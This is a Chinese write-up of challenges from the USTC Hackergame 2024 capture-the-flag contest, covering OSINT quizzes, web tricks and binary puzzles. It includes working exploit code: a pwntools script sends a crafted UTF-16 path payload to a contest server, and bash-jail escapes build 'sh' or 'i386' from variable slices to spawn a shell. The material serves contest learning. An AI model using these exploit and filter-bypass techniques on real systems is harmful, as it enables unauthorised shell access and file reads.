---
toc_depth: 1
---

# USTC Hackergame 2024

!!! Abstract "[USTC Hackergame 2024](https://hack.lug.ustc.edu.cn/)"

    - **比赛平台** : [hack.lug.ustc.edu.cn](https://hack.lug.ustc.edu.cn/)
    - **比赛时间** : 2024-11-02 12:00:00 - 2024-11-09 12:00:00 UTC+8
    - **官方仓库** : [github.com/USTC-Hackergame/hackergame2024-writeups](https://github.com/USTC-Hackergame/hackergame2024-writeups)
    - **题解仓库** : [github.com/13m0n4de/hackergame2024-writeups](https://github.com/13m0n4de/hackergame2024-writeups)

## [Web] 签到

如网页源码所示，填写错误时会跳转到 `/pass?=false`，正确时会跳转到 `/pass?=true`。

```javascript
function submitResult() {
    const inputs = document.querySelectorAll('.input-box');
    let allCorrect = true;

    inputs.forEach(input => {
        if (input.value !== answers[input.id]) {
            allCorrect = false;
            input.classList.add('wrong');
        } else {
            input.classList.add('correct');
        }
    });

    window.location = `?pass=${allCorrect}`;
}
```

所以直接在地址栏修改 `pass` 参数为 `true` 或手动发送 GET 请求就好：

```http
GET /?pass=true HTTP/1.1
```

## [Web] 喜欢做签到的 CTFer 你们好呀

「藏在中国科学技术大学校内 CTF 战队的招新主页」，我是先是用「USTC」作关键字搜到了 CTF Time 上的战队主页，然后才找到主页地址。

- [https://ctftime.org/team/168863/](https://ctftime.org/team/168863/)
- [https://www.nebuu.la/](https://www.nebuu.la/)

结果比赛主页的承办单位居然就有，眼神不太好使……

网站打开是一个终端，可以输入一些命令。

需要注意的是所有命令都是预设好的效果，能不能和终端命令行下产生同样效果，要看代码如何写。比如 `ls` 其实没法列出指定文件夹内容。

第一个 Flag 在 `env` 命令结果中，这个命令可以列出环境变量：

```
ctfer@ustc-nebula:$ ~ env
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOS❄️
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

第二个 Flag 在隐藏文件 `.flag` 中：

```
ctfer@ustc-nebula:$ ~ ls -la
.flag
.oh-you-found-it/
Awards
Members
Welcome-to-USTC-Nebula-s-Homepage/
and-We-are-Waiting-for-U/

ctfer@ustc-nebula:$ ~ cat .flag
flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}
```

### 其他

终端很熟悉，用的是 [m4tt72/terminal](https://github.com/m4tt72/terminal)，前两年我也把它用在工作室招新考核主页了。

这个终端不好复制的问题依然在，要么选中时不松手 CTRL+C，要么审查元素。

![px_page1](https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/web/%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84%20CTFer%20%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80/images/px_page1.png)
![px_page2](https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/web/%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84%20CTFer%20%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80/images/px_page2.png)

死去的回忆开始攻击我。

~~继[原神，启动！](https://github.com/SVUCTF/SVUCTF-HELLOWORLD-2023/blob/main/challenges/web/non_pressable_button/README.md)以来，又一 HG 抄袭我们野鸡比赛的力证。~~

心脏滴血的 ASCII Art 真好看。

## [General] 猫咪问答（Hackergame 十周年纪念版）

### Q1

> 1\. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）
>
> 提示：填写教室编号，如 5207、3A101。

在中国科学技术大学 Linux 用户协会的[活动页面](https://lug.ustc.edu.cn/wiki/lug/events/hackergame/)找到关于 Hackergame 的活动记录。

第三届 2016 年的链接已失效，第二届 2015 年的链接存档在：[https://lug.ustc.edu.cn/wiki/sec/contest.html](https://lug.ustc.edu.cn/wiki/sec/contest.html)

比赛时间安排中找到「3A204」教室。

答案：`3A204`

### Q2

> 2\. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？（30 分）
>
> 提示：是一个非负整数。

我是挨个看了往届比赛的题解仓库，找到每一届的题目数量：

- 2023: 29
- 2022: 33
- 2021: 31
- 2020: 31
- 2019: 28

最靠近 25 的是 2019 年的比赛，找到赛事相关新闻页面：[https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)

在新闻页面上发现有「2682」人注册。

答案：`2682`

### Q3

> 3\. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？（20 分）
>
> 提示：仅由中文汉字构成。

又是检索又是图书馆的，那肯定是问答题带来的热门检索了。

于是翻看 [Hackergame 2018 猫咪问答题解](https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md)，有一题：

> 在中国科大图书馆中，有一本书叫做《程序员的自我修养:链接、装载与库》，请问它的索书号是？
>
> 打开中国科大图书馆主页，直接搜索“程序员的自我修养”即可。

那么答案就是「程序员的自我修养」。

但准确信息是在[花絮](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)里。

答案：`程序员的自我修养`

### Q4

> 4\. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？（10 分）
>
> 提示：是一个非负整数。

在 [USENIX Security](https://www.usenix.org/) 官网搜索「email」，得到论文名称：

「FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechanism in Email Systems」

在 [论文 PDF](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf) 第 6 节 *Imperceptible Email Spoofing Attack*：

> Con-sequently, we propose six types of email spoofing attacks and measure their impact across 16 email services and 20 clients. All 20 clients are configured as MUAs for all 16 providers via IMAP, resulting in **336** combinations (including 16 web interfaces of target providers)

答案：`336`

### Q5

> 5\. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？（5 分）
>
> 提示：id 前 6 位，字母小写，如 c1e939。

足够争议性的话题，国内外媒体新闻漫天飞，相关信息挺多，但大多是指向 patch 的链接，不是合并。

在 Linux 内核的[官方 Git 仓库](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git)上搜索作者「Greg Kroah-Hartman」，可以得到删除 MAINTAINERS 的 commit：

[https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e90b675cf942e50c70e8394dfb5862975c3b3b2](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e90b675cf942e50c70e8394dfb5862975c3b3b2)

答案：`6e90b6`

### Q6

> 6\. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？（5 分）
>
> 提示：首次打开本页时的 HTML 源代码，答案是一个非负整数

要用 Llama 3 70B 的 Tokenizer，需要在 [HuggingFace 仓库](https://huggingface.co/meta-llama/Meta-Llama-3-70B) 向 Meta 申请访问权限，比赛时没想着等，找了在线的 Tokenizer：

- [https://tiktokenizer.vercel.app/?model=meta-llama%2FMeta-Llama-3-70B](https://tiktokenizer.vercel.app/?model=meta-llama%2FMeta-Llama-3-70B)
- [https://lunary.ai/llama3-tokenizer](https://lunary.ai/llama3-tokenizer)

得到的结果会上下浮动，有条件还是获得个访问权限，然后只使用 Tokenizer：

```python
import transformers
import requests


session = requests.session()
token = "<your_token>"
resp = session.get(
    "http://202.38.93.141:13030/",
    params={"token": token},
)

tokenizer = transformers.AutoTokenizer.from_pretrained("meta-llama/Meta-Llama-3-70B")
tokens = tokenizer.encode(resp.text)
print(len(tokens))
```

可能是带有 BOS Token 或者 EOS Token，我的代码得到结果是「1835」，正确答案为「1833」。

答案：`1833`

~~看了一些别人的题解，都是哪来的钱哪来的机器，70B 模型说跑就跑啊~~

## [General] 打不开的盒

STL 文件导入 Blender，进入编辑模式，透视框选删除上半部分全部的边和面，就可以看到 Flag 了：

![blender](https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92/images/blender.png)

比伸个摄像头进去看清晰得多。

## [General] 每日论文太多了！

好吧，我再也不要用 Firefox 打开 PDF 了，莫名其妙卡了我好久。

[下载论文 PDF](https://dl.acm.org/doi/pdf/10.1145/3650212.3652145?download=true)，搜索「flag」可以看到隐藏的 `flag_here` 字样：

![flag_here](https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%AF%8F%E6%97%A5%E8%AE%BA%E6%96%87%E5%A4%AA%E5%A4%9A%E4%BA%86%EF%BC%81/images/flag_here.png)

用 PDF 阅读器打开，移开上方的白色图片就能看到 Flag：

![flag](https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%AF%8F%E6%97%A5%E8%AE%BA%E6%96%87%E5%A4%AA%E5%A4%9A%E4%BA%86%EF%BC%81/images/flag.png)

Flag 有点糊糊的。

当时用 [pdfimages](https://linux.die.net/man/1/pdfimages) 提取了 PDF 中全部的图片，但只是随便翻看了一下，觉得「总不会在这么严肃的论文里藏什么东西吧」就关掉了。

## [Web] 比大小王

### 网页源码分析

游戏状态保存在 `state` 变量中：

```javascript
let state = {
    allowInput: false,
    score1: 0, // 玩家分数
    score2: 0, // 对手分数
    values: null, // 服务器返回题目数字
    startTime: null, // 开始时间
    value1: null, // 正在进行比较的数字 1
    value2: null, // 正在进行比较的数字 2
    inputs: [], // 玩家输入的答案，由 "<" 和 ">" 字符串组成的数组
    stopUpdate: false,
};
```

页面加载时会调用 `loadGame` 函数向 `/game` 发送 POST 请求获取题目：

```javascript
document.addEventListener('load', loadGame());

function loadGame() {
    fetch('/game', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({}),
        })
        .then(response => response.json())
        .then(data => {
            state.values = data.values;
            state.startTime = data.startTime * 1000;
            state.value1 = data.values[0][0];
            state.value2 = data.values[0][1];
            document.getElementById('value1').textContent = state.value1;
            document.getElementById('value2').textContent = state.value2;
            updateCountdown();
        })
        .catch(error => {
            document.getElementById('dialog').textContent = '加载失败，请刷新页面重试';
        });
}
```

服务端返回的 `values` 中包含了开始时间和比大小的一对对数字。

设置好 `state` 后，调用 `updateCountdown` 函数，根据开始时间播放倒计时动画：

```javascript
function updateCountdown() {
    if (state.stopUpdate) {
        return;
    }
    const seconds = Math.ceil((state.startTime - Date.now()) / 1000);
    if (seconds >= 4) {
        requestAnimationFrame(updateCountdown);
    }
    if (seconds <= 3 && seconds >= 1) {
        document.getElementById('dialog').textContent = seconds;
        requestAnimationFrame(updateCountdown);
    } else if (seconds <= 0) {
        document.getElementById('dialog').style.display = 'none';
        state.allowInput = true;
        updateTimer();
    }
}
```

当游戏开始时，调用 `updateTimer` 函数更新时间和对手进度，对手会在 10 秒完成题目：

```javascript
function updateTimer() {
    if (state.stopUpdate) {
        return;
    }
    const time1 = Date.now() - state.startTime;
    const time2 = Math.min(10000, time1);
    state.score2 = Math.max(0, Math.floor(time2 / 100));
    document.getElementById('time1').textContent = `${String(Math.floor(time1 / 60000)).padStart(2, '0')}:${String(Math.floor(time1 / 1000) % 60).padStart(2, '0')}.${String(time1 % 1000).padStart(3, '0')}`;
    document.getElementById('time2').textContent = `${String(Math.floor(time2 / 60000)).padStart(2, '0')}:${String(Math.floor(time2 / 1000) % 60).padStart(2, '0')}.${String(time2 % 1000).padStart(3, '0')}`;
    document.getElementById('score2').textContent = state.score2;
    document.getElementById('progress2').style.width = `${state.score2}%`;
    if (state.score2 === 100) {
        state.allowInput = false;
        state.stopUpdate = true;
        document.getElementById('dialog').textContent = '对手已完成，挑战失败！';
        document.getElementById('dialog').style.display = 'flex';
        document.getElementById('time1').textContent = `00:10.000`;
    } else {
        requestAnimationFrame(updateTimer);
    }
}
```

玩家按键或点击选择答案，会调用 `chooseAnswer` 函数将答案放入 `state.inputs` 中。当玩家获得 100 分时调用 `submit` 函数提交答案，否则显示错误信息：

```javascript
document.addEventListener('keydown', e => {
    if (e.key === 'ArrowLeft' || e.key === 'a') {
        document.getElementById('less-than').classList.add('active');
        setTimeout(() => document.getElementById('less-than').classList.remove('active'), 200);
        chooseAnswer('<');
    } else if (e.key === 'ArrowRight' || e.key === 'd') {
        document.getElementById('greater-than').classList.add('active');
        setTimeout(() => document.getElementById('greater-than').classList.remove('active'), 200);
        chooseAnswer('>');
    }
});
document.getElementById('less-than').addEventListener('click', () => chooseAnswer('<'));
document.getElementById('greater-than').addEventListener('click', () => chooseAnswer('>'));

function chooseAnswer(choice) {
    if (!state.allowInput) {
        return;
    }
    state.inputs.push(choice);
    let correct;
    if (state.value1 < state.value2 && choice === '<' || state.value1 > state.value2 && choice === '>') {
        correct = true;
        state.score1++;
        document.getElementById('answer').style.backgroundColor = '#5e5';
    } else {
        correct = false;
        document.getElementById('answer').style.backgroundColor = '#e55';
    }
    document.getElementById('answer').textContent = choice;
    document.getElementById('score1').textContent = state.score1;
    document.getElementById('progress1').style.width = `${state.score1}%`;
    state.allowInput = false;
    setTimeout(() => {
        if (state.score1 === 100) {
            submit(state.inputs);
        } else if (correct) {
            state.value1 = state.values[state.score1][0];
            state.value2 = state.values[state.score1][1];
            state.allowInput = true;
            document.getElementById('value1').textContent = state.value1;
            document.getElementById('value2').textContent = state.value2;
            document.getElementById('answer').textContent = '?';
            document.getElementById('answer').style.backgroundColor = '#fff';
        } else {
            state.allowInput = false;
            state.stopUpdate = true;
            document.getElementById('dialog').textContent = '你选错了，挑战失败！';
            document.getElementById('dialog').style.display = 'flex';
        }
    }, 200);
}
```

`submit` 函数发送例如 `{ "input": ["<", ">", ...] }` 的 JSON 数据：

```javascript
function submit(inputs) {
    fetch('/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                inputs
            }),
        })
        .then(response => response.json())
        .then(data => {
            state.stopUpdate = true;
            document.getElementById('dialog').textContent = data.message;
            document.getElementById('dialog').style.display = 'flex';
        })
        .catch(error => {
            state.stopUpdate = true;
            document.getElementById('dialog').textContent = '提交失败，请刷新页面重试';
            document.getElementById('dialog').style.display = 'flex';
        });
}
```

### 解法一：控制台调用函数

由于按钮点击有 200 毫秒的冷却，所以如果想要自动填写答案，需要先在开发者工具使用覆盖功能修改代码。

没这么麻烦的必要，可以直接在控制台调用 `submit` 函数，发送正确答案：

```javascript
submit(state.values.map(([v1, v2]) => v1 < v2 ? '<' : '>'))
```

需要注意得等倒计时结束，不然会「检测到时空穿越，挑战失败！」。

### 解法二：编写脚本发送请求

```python
import requests
import time


base_url = "http://202.38.93.141:12122/"
token = "<your_token>"

session = requests.session()
session.get(base_url, params={"token": token})

resp = session.post(f"{base_url}/game", json={})
game_data = resp.json()

answers = ["<" if value1 < value2 else ">" for value1, value2 in game_data["values"]]

start_time = game_data["startTime"]
current_time = time.time()
if current_time < start_time:
    wait_time = start_time - current_time
    time.sleep(wait_time)

resp = session.post(f"{base_url}/submit", json={"inputs": answers})
print(resp.json())
```

## [General] 旅行照片 4.0

### 题目 1-2

#### Q1

> 问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：X校区Y门，均为一个汉字）

百度地图搜索「科里科气科创驿站」，得到「中国蜀山科里科气科创驿站（科大站）」。

最近的两个门不是校门，往南走有东校区的西门，小小的。

![q1](https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/main/general/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/images/q1.png)

答案：`东校区西门`

#### Q2

> 问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：YYYYMMDD）

Bilibili 搜索「中科大 ACG 音乐会」，可以找到帐号「中科大LEO动漫协会」，他们有个视频合集：[2024ACG音乐会](https://space.bilibili.com/7021308/channel/collectiondetail?sid=3077731)。

视频简介可以找到「2024年5月19日 中国科大 第三届 ACG音乐会」。

答案：`20240519`

比赛时当作背景音在旁边放着听，科大的活动氛围真好。

### 题目 3-4

#### Q3

> 问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）

图片右下角垃圾桶找到地点「六安」。

搜索「六安 公园 彩虹跑道」找到文章：[彩虹跑道、灯光喷泉！六安城区这两所公园又变美了](https://www.sohu.com/a/498872898_100023473)。

答案：`中央公园` 或 `中央森林公园`

我只用到了搜索引擎，没用任何 APP，甚至不是国内搜索引擎。可能，~~狗运~~关键词猜得好胜过一切吧。

#### Q4

> 问题 4: 这个景观所在的景点的名字是？（三个汉字）

百度识图得到三峡大坝，搜索「三峡大坝 喷泉」得到「截流四面体纪念石」，进而得到景点。

国内地点，可能还是百度好用……

答案：`坛子岭`

### 题目 5-6

#### Q5

百度识图能发现一个图片中房子非常类似拍摄位置近处建筑，只不过是另一个角度：

![q5](https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/main/general/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/images/q5.png)

它来自 Bilibili 的一个视频：[和谐号黄医生动检车驶出动车所，进入京张高铁正线运行](https://www.bilibili.com/video/BV15J411R72H)

视频简介能够得到此处是「北京北动车所」，在地图中翻到最近的医院是「北京积水潭医院」

答案：`积水潭医院`

#### Q6

> 问题 6: 左下角的动车组型号是？

搜索 「"四编组动车" "北京" 北动车所」，得到网页：[https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html](https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html)

答案：`CRH6F-A`

### 碎碎念

不喜欢做国内地点，百度搜索和百度地图用着很难受，至今没搞明白怎么在某处搜索附近的建筑物。

而且国内地点很可能突然有人蹦出来告诉你：「嘿，我 XXX APP 随手一搜就出来了」。

多新鲜啊 —— Q5-6 题目文案。

## [General] 不宽的宽字符

CPP + WinAPI，看见人都晕了。

### 程序分析

程序首先通过 Windows API 初始化控制台环境，获取标准输入输出句柄并设置控制台模式：

```cpp
// Get the console input and output handles
HANDLE hConsoleInput = GetStdHandle(STD_INPUT_HANDLE);
HANDLE hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);

if (hConsoleInput == INVALID_HANDLE_VALUE || hConsoleOutput == INVALID_HANDLE_VALUE)
{
    // Handle error – we can't get input/output handles.
    return 1;
}

DWORD mode;
GetConsoleMode(hConsoleInput, &mode);
SetConsoleMode(hConsoleInput, mode | ENABLE_PROCESSED_INPUT);
```

接着使用 `ReadFile` 函数从控制台读取用户输入，存入 256 字节的缓冲区 `inputBuffer`，并移除末尾的换行符：

```cpp
// Read the console input (wide characters)
if (!ReadFile(hConsoleInput, inputBuffer, sizeof(inputBuffer), &charsRead, nullptr))
{
    // Handle read error
    return 2;
}

// Remove the newline character at the end of the input
if (charsRead > 0 && inputBuffer[charsRead - 1] == L'\n')
{
    inputBuffer[charsRead - 1] = L'\0'; // Null-terminate the string
    charsRead--;
}
```

为了处理不同语言的字符，程序将用户输入的 UTF-8 编码内容转换为宽字符。这个转换过程会保留输入中的所有字节，包括 `NULL` 字节：

```cpp
// Convert to WIDE chars
wchar_t buf[256] = { 0 };
MultiByteToWideChar(CP_UTF8, 0, inputBuffer, -1, buf, sizeof(buf) / sizeof(wchar_t));
```

然后程序把转换后的内容存入 `wstring` 对象，并自信地在后面加上 `you_cant_get_the_flag`，试图阻止直接访问目标文件：

```cpp
std::wstring filename = buf;

// Haha!
filename += L"you_cant_get_the_flag";
```

然而在打开文件时存在一个类型转换错误，直接将 `wchar_t*` 强制转换为了 `char*`：

```cpp
std::wifstream file;
file.open((char*)filename.c_str());
```

最后，如果文件成功打开，程序会读取第一行内容作为 Flag 并输出：

```cpp
if (file.is_open() == false)
{
    std::wcout << L"Failed to open the file!" << std::endl;
    return 3;
}

std::wstring flag;
std::getline(file, flag);

std::wcout << L"The flag is: " << flag << L". Congratulations!" << std::endl;
```

### 漏洞分析

在 Windows 系统中，`wchar_t` 使用 UTF-16 编码，这意味着每个字符用 2 个字节表示。比如字符 `A` 在 UTF-16 中表示为 `0x0041`。

Windows 默认使用小端序（Little Endian），所以在这道题中字符 `A` 在内存中实际是 `41 00`。

程序的核心漏洞在于对字符串的类型转换，当程序执行：

```cpp
(char*)filename.c_str()
```

宽字符字符串 `wchar_t*` 被强制转换为普通字符串 `char*`，原本的 UTF-16 字节被直接解释为连续的字节序列。

举个例子，如果我们输入 `flag`：

程序会将其转换为 UTF-16 编码的字节串：

```
$ echo -n "flag" | iconv -f ascii -t utf-16le | hexyl -g 2
┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
│00000000│ 6600 6c00 6100 6700 ┊                     │f⋄l⋄a⋄g⋄┊        │
└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
```

然后追加 `you_cant_get_the_flag`：

```
$ echo -n "flagyou_cant_get_the_flag" | iconv -f ascii -t utf-16le | hexyl -g 2
┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
│00000000│ 6600 6c00 6100 6700 ┊ 7900 6f00 7500 5f00 │f⋄l⋄a⋄g⋄┊y⋄o⋄u⋄_⋄│
│00000010│ 6300 6100 6e00 7400 ┊ 5f00 6700 6500 7400 │c⋄a⋄n⋄t⋄┊_⋄g⋄e⋄t⋄│
│00000020│ 5f00 7400 6800 6500 ┊ 5f00 6600 6c00 6100 │_⋄t⋄h⋄e⋄┊_⋄f⋄l⋄a⋄│
│00000030│ 6700                ┊                     │g⋄      ┊        │
└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
```

当这个字符串被强制转换为 `char*` 时，程序会从这个内存地址开始，按照 C 风格字符串的规则读取字节序列：

```
66 00 6C 00 61 00 67 00 ...
   ^
遇到 00 时字符串结束
```

即文件名为 `B`（ASCII 编码为 66）。

所以如果我们精心构造一个字符串，让它在 UTF-16 编码下的字节序列满足：当被强制转换为 `char*` 时，这些字节正好表示 `Z:\\theflag`，并且紧跟一个 `NULL` 字节。

假设我们需要构造路径 `Z:\\theflag`，它的字节序列（包括 `NULL`）是：

```
$ echo -ne "Z:\\\\theflag\x00" | hexyl
┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐
│00000000│ 5a 3a 5c 74 68 65 66 6c ┊ 61 67 00                │Z:\thefl┊ag⋄     │
└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘
```

我们需要找到一个字符串，它的 UTF-16LE 编码恰好是这个序列，即每两个字节组成一个 UTF-16 字符：

```
$ echo -ne "Z:\\\\theflag\x00" | hexyl -g 2
┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
│00000000│ 5a3a 5c74 6865 666c ┊ 6167 00             │Z:\thefl┊ag⋄     │
└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
```

这个过程在 Python 中很好实现：

```python
payload = b"Z:\\\\theflag\x00".decode("utf-16-le").encode()
```

### 利用脚本

```python
from pwn import *

context.log_level = "debug"

token = "<your_token>"

io = remote("202.38.93.141", 14202)
io.sendlineafter(b"token", token.encode())

payload = b"Z:\\\\theflag\x00".decode("utf-16-le").encode()
io.sendlineafter(b"to it:", payload)

io.interactive()
```

### 其他

如果想要正确处理 `wchar_t*` 字符串转换为 `char*` 的情景，正确且安全的方式是使用 `wcstombs_s` 函数。

例如：

```cpp
size_t convertedChars = 0;
size_t sizeInBytes = ((filename.length() + 1) * 2);
std::vector<char> converted(sizeInBytes);

errno_t err = wcstombs_s(
    &convertedChars,
    converted.data(),
    sizeInBytes,
    filename.c_str(),
    sizeInBytes
);
```

参考：

- [How to: Convert System::String to wchar_t\* or char\*](https://learn.microsoft.com/en-us/cpp/dotnet/how-to-convert-system-string-to-wchar-t-star-or-char-star?view=msvc-170)
- [wcstombs_s, \_wcstombs_s_l](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/wcstombs-s-wcstombs-s-l?view=msvc-170)

## [General] PowerfulShell

一道 Bash Jail 类型的题，严格限制了可用字符，所有输入会经过字符检查，如果包含禁用字符则退出，合法输入会被 `eval` 执行。

```bash
#!/bin/bash

FORBIDDEN_CHARS="'\";,.%^*?!@#%^&()><\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"

PowerfulShell() {
    while true; do
        echo -n 'PowerfulShell@hackergame> '
        if ! read input; then
            echo "EOF detected, exiting..."
            break
        fi
        if [[ $input =~ [$FORBIDDEN_CHARS] ]]; then
            echo "Not Powerful Enough :)"
            exit
        else
            eval $input
        fi
    done
}

PowerfulShell
```

关键限制：

- 禁用了所有字母 (`a-z, A-Z`)
- 禁用了常用的通配符 (`*, ?`)
- 禁用了引号 (`', "`)
- 禁用了分隔符 (`;, .`)
- 禁用了数字 `0`

可用字符：

- 空格：用于分隔命令
- `$`：变量引用
- `+-`：算术运算
- `123456789`：数字
- `:`：用于字符串操作
- `=`： 赋值操作
- `[]{}|`：用于命令替换和管道
- `_`：下划线
- `` ` ``：命令替换
- `~`：家目录

### 非预期解

在测试各种可用[Shell 变量 (Shell Variables)](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables) 和 [特殊参数 (Special Parameters)](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters)，我发现两个变量的值中包含了被禁用的字符：

- `$-`: `hB`
- `$_`: `input`

`$-` 是 Shell 选项标志 (option flags)，`h` (hashall) 表示记住命令的位置，`B` (braceexpand) 表示启用大括号拓展。

`$_` 是上一个命令的最后一个参数，即 `eval $input` 语句中的 `input`。

那么我们可以通过字符串切片获得 `hBinput` 字符任意数量排列组合的命令，例如：

- `php`: `${_:2:1}${-::1}${_:2:1}`
- `pip`: `${_:2:1}${_::1}${_:2:1}`
- `init`: `${_::2}${_::1}${_:4:1}`
- `h2ph`: `${-::1}2${_:2:1}${-::1}`

可惜靶机环境缺少这些命令，无法直接使用。于是我编写了一个脚本，用来查找本地系统中所有仅由这些可用字符组成的命令，并自动生成对应的构造表达式：

```python
import os
from pathlib import Path

allowed = set("hBinput123456789-")
option_flags = "hB"  # $-
last_arg = "input"  # $_


def char_to_expr(c: str) -> str:
    if c.isdigit():
        return c
    if c in option_flags:
        return f"${{-:{option_flags.index(c) or ''}:1}}"
    if c in last_arg:
        return f"${{_:{last_arg.index(c) or ''}:1}}"
    return ""


commands = {
    cmd.name
    for path in os.environ["PATH"].split(":")
    if os.path.exists(path)
    for cmd in Path(path).iterdir()
    if os.access(cmd, os.X_OK) and set(cmd.name) <= allowed
}

for cmd in sorted(commands):
    expr = "".join(char_to_expr(c) for c in cmd)
    print(f"{cmd}:\t{expr}")
```

结果：

```
h2ph:   ${-::1}2${_:2:1}${-::1}
i386:   ${_::1}386
init:   ${_::1}${_:1:1}${_::1}${_:4:1}
ip:     ${_::1}${_:2:1}
php:    ${_:2:1}${-::1}${_:2:1}
tput:   ${_:4:1}${_:2:1}${_:3:1}${_:4:1}
```

`tput` 是一个用于控制终端输出格式的命令，没有什么用。

`i386` 是 `setarch` 命令的符号链接，`setarch` 包含在 [util-linux](https://github.com/util-linux/util-linux) 包中，用于改变程序运行时的系统架构环境。

例如在 AMD64 (x86_64) 系统上，运行 `i386 command` 会使得 `command` 看到的系统架构是 `i686` 而不是 `x86_64`。

更重要的是，根据 man page 的说明，如果不指定要运行的程序，`setarch` 会默认运行 `/bin/sh`：

```
The execution domains currently only affects the output of uname -m.
For example, on an AMD64 system, running setarch i386 program will
cause program to see i686 instead of x86_64 as the machine type. It can
also be used to set various personality options. The default program is
/bin/sh.
```

这意味着直接运行 `i386` 命令就能获得一个完整的 shell 环境：

```
PowerfulShell@hackergame> ${_::1}386
id
uid=1000(players) gid=1000(players) groups=1000(players)
```

另外：那么为什么会有一个 `i386` 链接到 `setarch` 呢？

在源码的 [478-479 行](https://github.com/util-linux/util-linux/blob/4e14b5731efcd703ad13e24362448c87cecb5424/sys-utils/setarch.c#L478-L480)中写道，如果程序名不是 `setarch`，就认为是通过符号链接调用的，这时会把程序名当作目标架构名：

```c
archwrapper = strcmp(program_invocation_short_name, "setarch") != 0;
if (archwrapper) {
    arch = program_invocation_short_name;	/* symlinks to setarch */
```

你可以看到系统中还存在其他许多符号链接：

```
$ find /usr/bin -type l -lname '*setarch*' 2>/dev/null
/usr/bin/i386
/usr/bin/linux32
/usr/bin/linux64
/usr/bin/uname26
/usr/bin/x86_64
```

### 预期解

预期解是利用 `$HOME` 变量值 `/players` 中的 `s` 字符，与 `$-` 变量值 `hB` 中的 `h` 组合构造出 `sh`。

`~` 会被扩展为 `$HOME` 变量，所以将 `~` 赋值给符合 Bash 命名规则的新变量，再对它进行切片：

```bash
_1=~                    # /players
_2=$-                   # hB
${_1:7:1}${_2: -2:1}    # sh
```

直接使用 `${~:7:1}` 是不行的，比赛中我这里卡了一下，所以放弃了这种解法。

来看看 AI 朋友的解释：

> 在 bash 中，`${parameter:offset:length}` 语法用于字符串切片，其中 `parameter`:
>
> 可以是变量名（如 `$HOME`, `$PATH`）
> 可以是特殊参数（如 `$@`, `$*`, `$#`, `$-`, `$_`）
> 必须是一个有效的参数引用
>
> `~` 不是一个变量或参数名，它是一个特殊字符：
>
> 作为命令的第一个字符时，bash 会将其扩展为 `$HOME` 的值
> 但在参数扩展语法 `${...}` 中，它不会被识别为一个有效的参数名
>
> 因此需要两步操作：
>
> 先将 `~` 赋值给一个变量，这时 bash 会进行扩展，变量获得 `$HOME` 的值
> 然后对这个变量进行切片操作

